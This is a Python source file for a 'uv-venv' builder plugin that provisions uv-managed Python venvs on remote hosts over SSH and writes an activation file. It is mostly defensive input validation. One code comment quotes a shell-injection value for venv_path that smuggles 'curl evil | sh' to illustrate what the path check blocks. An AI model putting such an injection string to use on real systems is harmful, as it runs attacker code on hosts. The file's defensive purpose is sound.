"""``uv-venv`` builder — provision a Python venv on target hosts via ``uv``.

An *environment builder*: instead of preparing a container image, it ensures a
``uv``-created Python venv exists on each target host with the requested packages,
and writes a shell **env_file** that activates it (prepends the venv's ``bin`` to
``PATH``, plus an optional ``CUDA_HOME`` for building JIT extensions). It pairs with
``executor: local`` (native, no container), which sources the env_file before the
serve command — so ``vllm``/``nvcc``/``ninja`` resolve from the venv. The local
executor auto-populates its ``env_file`` from this builder's
:meth:`~sparkrun.builders.base.BuilderPlugin.default_env_file`, so a recipe only
declares ``builder`` + ``executor: local``.

This is the answer to running vllm-class runtimes on hosts where nested ``docker
run`` doesn't work (e.g. Thunder Compute's proot/fastvfs sandbox): run the workload
directly in a venv, no container.

Opt-in per recipe via ``builder: uv-venv`` (or the ``venv`` alias), and gated behind
``builder.uv_venv`` — off on stable, on by default for beta/alpha. Unlike an image
builder it mutates the *host* (creating a venv, installing packages), which is why
stable requires an explicit opt-in. Its companion ``local`` executor is gated too
(``executor.local``).

Recipe (self-contained)::

    builder: uv-venv
    builder_config:
      requirements: ["vllm", "ninja"]        # inline list  \\
      requirements_file: reqs.txt            #  one OR MORE  } requirement sources
      pyproject: pyproject.toml              # OR a pyproject /
      torch_backend: auto                    # default `auto`; `none` disables the flag
      cuda_home: /usr/local/cuda             # optional -> exported + on PATH in env_file
      python: "3.12"                         # optional (default 3.12)
      # venv_path: /abs/path                 # optional; default $HOME/.cache/sparkrun/uv-venv/<dep-hash>
      # env_file:  /abs/path.sh              # optional; default <venv_path>/sparkrun-env.sh
    executor: local                          # env_file auto-wired from the builder

``requirements_file`` / ``pyproject`` are CONTROL-side paths (absolute, or relative to the
recipe file's directory); their contents are read at build time and embedded in the
provisioning script (no separate file transfer). All sources combine into one
``uv pip install``. Idempotent: a marker under the venv stores a hash of (python,
torch_backend, inline requirements, staged-file contents); provisioning is skipped when
the venv exists and the hash matches, and re-runs when anything changes.
"""

from __future__ import annotations

import hashlib
import logging
import os
import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

from sparkrun.builders.base import BuilderPlugin
from sparkrun.orchestration.ssh import run_remote_scripts_parallel
from sparkrun.utils.shell import quote

if TYPE_CHECKING:
    from sparkrun.core.config import SparkrunConfig
    from sparkrun.core.recipe import Recipe

logger = logging.getLogger(__name__)

_DEFAULT_PYTHON = "3.12"
_PROVISION_TIMEOUT = 1800  # first-time vllm+torch install pulls GBs
_STAGE_DIR = ".sparkrun-reqs"  # under the venv, for embedded requirement files

#: Default ``uv pip install --torch-backend``.
#:
#: ``auto`` makes uv match the *host's* CUDA driver rather than serving
#: whatever the index defaults to — which on a DGX Spark (GB10 / sm_121) is
#: the difference between a working install and a torch that cannot see the
#: GPU. The whole point of provisioning per-host is that the host decides, so
#: the default follows the host.
_DEFAULT_TORCH_BACKEND = "auto"

#: ``torch_backend`` values that mean "don't pass the flag at all".
_TORCH_BACKEND_OFF = frozenset({"none", "off", "false", "no", "-"})


class UvVenvError(RuntimeError):
    """uv-venv provisioning failed (bad config or a host install error)."""


#: Path body allowed after an optional ``$HOME``/``~`` prefix.
#:
#: These paths are emitted **double-quoted** so bash expands ``$HOME`` on the
#: host, which is the whole point of supporting them — but that also means
#: shlex-quoting them is not an option, so the safety has to come from
#: validation instead. ``builder_config`` reaches here straight off a recipe,
#: and a recipe can come from a third-party registry: without this, a
#: ``venv_path`` of ``/v"; curl evil | sh; echo "`` runs on every target host.
#: Unlike ``executor_config``, ``builder_config`` has no trust gate, so this
#: cannot rely on one.
_SAFE_PATH_BODY_RE = re.compile(r"[A-Za-z0-9_./+-]*")

#: A requirement may not start with ``-``: shlex-quoting leaves ``--index-url=…``
#: untouched (it has no shell metacharacters), so it would reach ``uv pip
#: install`` as a *flag* and silently repoint the package index. Requirement
#: strings are values, never options.
_REQUIREMENT_FLAG_PREFIX = "-"


def _validate_host_path(value: str, *, field_name: str) -> str:
    """Validate a host-side path that will be emitted unquoted-but-double-quoted.

    Permits a leading ``~/`` or ``$HOME/`` (expanded by the remote shell) and
    otherwise only characters that carry no meaning to bash.
    """
    body = value
    for prefix in ("$HOME/", "${HOME}/", "~/"):
        if body.startswith(prefix):
            body = body[len(prefix) :]
            break
    else:
        if not value.startswith("/"):
            raise UvVenvError("uv-venv: %s must be absolute or $HOME/~-relative: %r" % (field_name, value))
    if not _SAFE_PATH_BODY_RE.fullmatch(body):
        raise UvVenvError("uv-venv: unsafe character in %s %r — paths are interpolated into a host shell script" % (field_name, value))
    return value


@dataclass
class _Spec:
    venv_path: str
    python: str = _DEFAULT_PYTHON
    torch_backend: str | None = _DEFAULT_TORCH_BACKEND
    cuda_home: str | None = None
    env_file: str = ""
    requirements: list[str] = field(default_factory=list)
    # Requirement files staged into the venv at build time: (host_filename, content).
    staged: list[tuple[str, str]] = field(default_factory=list)

    def dep_hash(self) -> str:
        parts = [self.python, self.torch_backend or "", *sorted(self.requirements)]
        parts += ["%s\x00%s" % (name, content) for name, content in sorted(self.staged)]
        return hashlib.sha256("|".join(parts).encode()).hexdigest()[:16]


def _resolve_path(recipe: "Recipe", path: str) -> str:
    """Resolve a control-side config path: absolute as-is, else relative to the recipe dir."""
    if os.path.isabs(path):
        return path
    src = getattr(recipe, "source_path", None)
    base = os.path.dirname(src) if src else os.getcwd()
    return os.path.join(base, path)


def _read_source_file(recipe: "Recipe", raw: str, *, kind: str, default_name: str) -> tuple[str, str]:
    """Read a requirements/pyproject file → (host_filename, content). Raises UvVenvError if unreadable."""
    path = _resolve_path(recipe, raw)
    # For pyproject, accept a directory containing pyproject.toml.
    if kind == "pyproject" and os.path.isdir(path):
        path = os.path.join(path, "pyproject.toml")
    try:
        with open(path, encoding="utf-8") as fh:
            content = fh.read()
    except OSError as e:
        raise UvVenvError("uv-venv: cannot read %s %r (resolved %r): %s" % (kind, raw, path, e)) from e
    return default_name, content


def _resolve_spec(recipe: "Recipe") -> _Spec:
    cfg = dict(getattr(recipe, "builder_config", None) or {})

    reqs = cfg.get("requirements") or []
    if isinstance(reqs, str):
        reqs = [reqs]
    reqs = [str(r).strip() for r in reqs if str(r).strip()]
    for req in reqs:
        if req.startswith(_REQUIREMENT_FLAG_PREFIX):
            raise UvVenvError(
                "uv-venv: requirement %r looks like a uv/pip option, not a requirement. "
                "Options are not accepted here — they would change where packages are installed from." % req
            )

    staged: list[tuple[str, str]] = []
    if cfg.get("requirements_file"):
        staged.append(_read_source_file(recipe, str(cfg["requirements_file"]), kind="requirements_file", default_name="requirements.txt"))
    if cfg.get("pyproject"):
        staged.append(_read_source_file(recipe, str(cfg["pyproject"]), kind="pyproject", default_name="pyproject.toml"))

    if not reqs and not staged:
        raise UvVenvError("uv-venv: give at least one of requirements / requirements_file / pyproject in builder_config")

    python = str(cfg.get("python") or _DEFAULT_PYTHON)
    # Absent -> "auto" (follow the host). Present-but-empty/none -> no flag,
    # which is the only way to opt out now that the default is on.
    if "torch_backend" in cfg:
        raw_backend = str(cfg["torch_backend"] if cfg["torch_backend"] is not None else "").strip()
        torch_backend = None if raw_backend.lower() in _TORCH_BACKEND_OFF or not raw_backend else raw_backend
    else:
        torch_backend = _DEFAULT_TORCH_BACKEND

    cuda_home = (str(cfg["cuda_home"]).strip() or None) if cfg.get("cuda_home") else None
    if cuda_home:
        _validate_host_path(cuda_home, field_name="cuda_home")

    spec = _Spec(
        venv_path="",  # set below (depends on dep_hash)
        python=python,
        torch_backend=torch_backend,
        cuda_home=cuda_home,
        requirements=reqs,
        staged=staged,
    )
    # Self-determined default venv path: shared per dep_hash so recipes with identical deps
    # reuse one venv. $HOME-relative — the local executor expands it (+ env_file) at source time.
    spec.venv_path = str(cfg.get("venv_path") or "").strip() or ("$HOME/.cache/sparkrun/uv-venv/%s" % spec.dep_hash())
    spec.env_file = str(cfg.get("env_file") or "").strip() or ("%s/sparkrun-env.sh" % spec.venv_path.rstrip("/"))
    _validate_host_path(spec.venv_path, field_name="venv_path")
    _validate_host_path(spec.env_file, field_name="env_file")
    return spec


def _heredoc_delimiter(index: int, content: str) -> str:
    """Return a heredoc delimiter that appears on no line of *content*.

    A fixed delimiter is a shell-injection vector: a requirements file
    containing a line equal to it closes the heredoc early, and everything
    after it is executed as script rather than written as data. Seeding from a
    content hash makes a collision unreachable in practice; the loop makes it
    impossible in principle.
    """
    digest = hashlib.sha256(content.encode()).hexdigest()[:12]
    delim = "SPARKRUN_REQ_EOF_%d_%s" % (index, digest)
    lines = {line.strip() for line in content.splitlines()}
    while delim in lines:
        delim += "X"
    return delim


def _provision_script(spec: _Spec) -> str:
    # venv_path / env_file are trusted config and may be $HOME-relative — emit them
    # double-quoted so bash expands $HOME/$VAR on the host (shlex-quoting would freeze
    # them to a literal). Requirements/python are shlex-quoted (no expansion wanted).
    want = spec.dep_hash()
    install_args = " ".join(quote(r) for r in spec.requirements)
    for name, _content in spec.staged:
        install_args += ' -r "$VENV/%s/%s"' % (_STAGE_DIR, name)
    if spec.torch_backend:
        install_args += " --torch-backend %s" % quote(spec.torch_backend)
    install_args = install_args.strip()

    # Stage embedded requirement files under the venv (quoted heredoc → written verbatim).
    stage_lines = ""
    if spec.staged:
        stage_lines = 'mkdir -p "$VENV/%s"\n' % _STAGE_DIR
        for i, (name, content) in enumerate(spec.staged):
            delim = _heredoc_delimiter(i, content)
            stage_lines += 'cat > "$VENV/%s/%s" <<%s\n%s\n%s\n' % (_STAGE_DIR, name, "'%s'" % delim, content.rstrip("\n"), delim)

    # env_file body (written verbatim via a quoted heredoc, so $HOME/$PATH expand when the
    # local executor SOURCES it): venv bin first, then cuda bin (if any), then existing PATH.
    venv_bin = "%s/bin" % spec.venv_path.rstrip("/")
    if spec.cuda_home:
        cuda_bin = "%s/bin" % spec.cuda_home.rstrip("/")
        path_line = 'export PATH="%s:%s:$PATH"' % (venv_bin, cuda_bin)
        cuda_line = 'export CUDA_HOME="%s"\n' % spec.cuda_home
    else:
        path_line = 'export PATH="%s:$PATH"' % venv_bin
        cuda_line = ""

    # The dep marker guards only the EXPENSIVE half (venv creation + install).
    # The env_file is rewritten unconditionally: its contents depend on
    # cuda_home / venv_path, which deliberately do NOT feed dep_hash (they don't
    # change the venv). Guarding the whole script on the marker meant that
    # adding cuda_home to a recipe whose venv already existed was a silent
    # no-op — the script exited before ever writing the new env_file, and the
    # workload kept launching without CUDA_HOME on PATH.
    return (
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        'VENV="%(venv)s"; ENV_FILE="%(env_file)s"; MARKER="$VENV/.sparkrun-uv-venv.hash"; WANT="%(want)s"\n'
        'export PATH="/usr/local/bin:$HOME/.local/bin:$PATH"\n'
        'if [ -x "$VENV/bin/python" ] && [ "$(cat "$MARKER" 2>/dev/null || true)" = "$WANT" ]; then\n'
        '  echo "uv-venv: up-to-date ($VENV)"\n'
        "else\n"
        "  if ! command -v uv >/dev/null 2>&1; then\n"
        '    python3 -m pip install -q uv || { curl -LsSf https://astral.sh/uv/install.sh | sh; export PATH="$HOME/.local/bin:$PATH"; }\n'
        "  fi\n"
        '  echo "uv-venv: creating venv at $VENV (python %(python)s)"\n'
        '  uv venv "$VENV" --python %(python)s\n'
        "%(stage)s"
        '  echo "uv-venv: installing %(install)s"\n'
        '  uv pip install --python "$VENV/bin/python" %(install)s\n'
        '  echo "$WANT" > "$MARKER"\n'
        '  echo "uv-venv: provisioned $VENV"\n'
        "fi\n"
        'mkdir -p "$(dirname "$ENV_FILE")"\n'
        "cat > \"$ENV_FILE\" <<'EOF'\n"
        "# sparkrun uv-venv activation (managed by the uv-venv builder)\n"
        "%(path_line)s\n"
        "%(cuda_line)s"
        "EOF\n"
        'echo "uv-venv: env_file $ENV_FILE"\n'
    ) % {
        "venv": spec.venv_path,
        "env_file": spec.env_file,
        "want": want,
        "python": quote(spec.python),
        "stage": stage_lines,
        "install": install_args,
        "path_line": path_line,
        "cuda_line": cuda_line,
    }


class UvVenvBuilder(BuilderPlugin):
    """Ensure a uv-managed Python venv (+ activation env_file) on each target host."""

    builder_name = "uv-venv"
    builder_aliases = ("venv",)
    required_feature_flag = "builder.uv_venv"

    def prepare(
        self,
        image: str,
        recipe: "Recipe",
        hosts: list[str],
        config: "SparkrunConfig | None" = None,
        dry_run: bool = False,
        transfer_mode: str = "local",
        ssh_kwargs: dict | None = None,
    ) -> str:
        """Provision the venv on every target host. Returns *image* unchanged (no container)."""
        spec = _resolve_spec(recipe)
        script = _provision_script(spec)
        logger.info("uv-venv: ensuring venv %s on %d host(s)", spec.venv_path, len(hosts))

        # Parallel, and under the session guard. A first-time vllm+torch
        # install is minutes of network and disk per host: serially that is
        # len(hosts) x the wait, and without the guard a Ctrl-C on the control
        # node leaves `uv pip install` running on every host with nothing left
        # to observe or stop it (see ssh.wrap_with_session_guard / issue #240).
        # allow_local so a control node that is also a target works without
        # self-SSH, matching the status/teardown fan-outs.
        results = run_remote_scripts_parallel(
            list(hosts),
            script,
            timeout=_PROVISION_TIMEOUT,
            dry_run=dry_run,
            allow_local=True,
            session_guard=True,
            **(ssh_kwargs or {}),
        )
        if dry_run:
            return image

        failures = [r for r in results if r.returncode != 0]
        if failures:
            detail = "; ".join("%s (rc=%d): %s" % (r.host, r.returncode, (r.stderr or r.stdout or "").strip()[:300]) for r in failures)
            raise UvVenvError("uv-venv provisioning failed on %d/%d host(s): %s" % (len(failures), len(results), detail))
        return image

    def default_env_file(self, recipe: "Recipe") -> str | None:
        """Env_file the local executor should source — auto-couples builder → executor."""
        try:
            return _resolve_spec(recipe).env_file
        except UvVenvError:
            return None
